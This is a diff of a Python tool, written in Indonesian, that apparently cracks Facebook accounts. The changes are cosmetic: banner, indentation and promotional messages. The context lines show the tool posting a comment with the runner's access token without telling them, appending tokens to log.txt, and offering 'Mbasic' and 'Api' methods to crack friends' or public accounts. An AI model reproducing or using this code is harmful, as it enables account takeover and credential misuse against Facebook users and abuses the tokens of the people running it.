@@ -1,4 +1,4 @@
-################################################
+###############################
 # Mau Recode? Sertain author yg buat :v #
 # Author: RamdhanRamadhian | github: Ramdhan7 :v    #
 ###############################
@@ -11,10 +11,10 @@ try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.str
 except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
 #nama - nama buat logo :v
 try:
-log=pyfiglet.figlet_format('LOGIN')
-title=pyfiglet.figlet_format('CRACK')
-teman=pyfiglet.figlet_format('TEMAN')
-publik=pyfiglet.figlet_format('PUBLIK')
+	log=pyfiglet.figlet_format('LOGIN')
+	title=pyfiglet.figlet_format('CRACK')
+	teman=pyfiglet.figlet_format('TEMAN')
+	publik=pyfiglet.figlet_format('PUBLIK')
 except:os.system('pip install pyfiglet')
 
 os.system("clear")
@@ -33,7 +33,7 @@ def pilihLogin():
 		try:
 			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
 			print("[√] Login Berhasil\nNama Akun :",r['name'])
-			r2=req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Love you beb&access_token={token}")
+			r2=req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Hello abang tampan&access_token={token}")
 			open('log.txt','a').write(token)
 			time.sleep(2)
 			nampung(token).menu()
@@ -62,7 +62,7 @@ def pilihLogin():
 			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 			os.system("clear")
 			print("[√] Login Berhasil\nNama Akun :",ru['name'])
-			req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Love you beb&access_token={to}")
+			req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Hello abang tampan&access_token={to}")
 			time.sleep(2)
 			open("log.txt","a").write(to)
 			nampung(to).menu()
@@ -194,7 +194,7 @@ class nampung:
 	def sendTeman(self):
 		global idTeman
 		os.system('clear')
-		print(teman+"\nSubscribe Youtube @Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
+		print(teman+"\nSubscribe Channel Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
 		print('[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
 		pi=input("[?] Mau methode mana : ")
 		time.sleep(1)
@@ -227,7 +227,7 @@ class nampung:
 	def sendPublik(self):
 		global idPublik
 		os.system('clear')
-		print(publik+"\nSubscribe Youtube : @Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
+		print(publik+"\nSubscribe Youtube Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
 		print('\n[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
 		pi=input("[?] Mau methode mana : ")
 		print("")
